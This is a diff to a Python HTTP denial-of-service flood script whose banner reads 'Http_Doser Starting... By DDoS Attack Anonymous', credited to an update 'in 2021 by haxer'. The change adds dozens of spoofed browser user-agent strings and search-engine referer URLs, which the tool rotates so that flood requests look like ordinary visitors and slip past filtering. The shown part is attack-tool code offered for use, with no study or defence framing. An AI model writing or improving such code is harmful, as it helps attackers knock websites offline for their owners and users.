@@ -40,14 +40,50 @@ def useragent_list():
 	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
 	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
 	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
+	headers_useragents.append('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36')
+	headers_useragents.append('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36')
+	headers_useragents.append('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36')
+	headers_useragents.append('Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/10.1 Chrome/71.0.3578.99 Mobile Safari/537.36')
+	headers_useragents.append('Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.97 Safari/537.22 Perk/3.3.0.0)')
+	headers_useragents.append('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36')
+	headers_useragents.append('Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36')
+	headers_useragents.append('Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36')
+	headers_useragents.append('Mozilla/5.0 (Macintosh; Intel Mac OS X 11_3_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36')
+	headers_useragents.append('Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36')
+	headers_useragents.append('Mozilla/5.0 (iPhone; CPU iPhone OS 14_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/90.0.4430.78 Mobile/15E148 Safari/604.1')
+	headers_useragents.append('Mozilla/5.0 (iPad; CPU OS 14_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/90.0.4430.78 Mobile/15E148 Safari/604.1')
+	headers_useragents.append('Mozilla/5.0 (iPod; CPU iPhone OS 14_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/90.0.4430.78 Mobile/15E148 Safari/604.1')
+	headers_useragents.append('Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36')
+	headers_useragents.append('Mozilla/5.0 (Linux; Android 10; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36')
+	headers_useragents.append('Mozilla/5.0 (Linux; Android 10; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36')
+	headers_useragents.append('Mozilla/5.0 (Linux; Android 10; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36')
+	headers_useragents.append('Mozilla/5.0 (Linux; Android 10; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36')
+	headers_useragents.append('Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0')
+	headers_useragents.append('Mozilla/5.0 (Macintosh; Intel Mac OS X 11.3; rv:88.0) Gecko/20100101 Firefox/88.0')
+	headers_useragents.append('Mozilla/5.0 (X11; Linux i686; rv:88.0) Gecko/20100101 Firefox/88.0')
+	headers_useragents.append('Mozilla/5.0 (Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0')
+	headers_useragents.append('Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:88.0) Gecko/20100101 Firefox/88.0')
+	headers_useragents.append('Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0')
+	headers_useragents.append('Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0')
+	headers_useragents.append('Mozilla/5.0 (iPhone; CPU iPhone OS 11_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/33.0 Mobile/15E148 Safari/605.1.15')
+	headers_useragents.append('Mozilla/5.0 (iPad; CPU OS 11_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/33.0 Mobile/15E148 Safari/605.1.15')
+	headers_useragents.append('Mozilla/5.0 (Android 11; Mobile; rv:68.0) Gecko/68.0 Firefox/88.0')
+	headers_useragents.append('Mozilla/5.0 (Android 11; Mobile; LG-M255; rv:88.0) Gecko/88.0 Firefox/88.0')
 	return(headers_useragents)
 
 # generates a referer array
 def referer_list():
 	global headers_referers
 	headers_referers.append('http://www.google.com/?q=')
+	headers_referers.append('https://duckduckgo.com/?q=')
+	headers_referers.append('https://yandex.com/search/?text=')
+	headers_referers.append('http://www.bing.com/search?q=')
+	headers_referers.append('https://www.microsoft.com/en-us/search?q=')
+	headers_referers.append('http://search.yahoo.com/search?p=')
+	headers_referers.append('http://www.ask.com/web?q=')
 	headers_referers.append('http://www.usatoday.com/search/results?q=')
 	headers_referers.append('http://engadget.search.aol.com/search?q=')
+	headers_referers.append('http://search.lycos.com/web/?q=')
 	headers_referers.append('http://' + host + '/')
 	return(headers_referers)
 	
@@ -68,7 +104,7 @@ print \
 """
                    ...
                  ;::::;   Http_Doser Starting...
-               ;::::; :;    By DDoS Attack Anonymous
+               ;::::; :;    By DDoS Attack Annonymous (updated in 2021 by haxer. Anonymous shall rise again)
              ;:::::'   :;
             ;:::::;     ;.
            ,:::::'       ;           OOO\
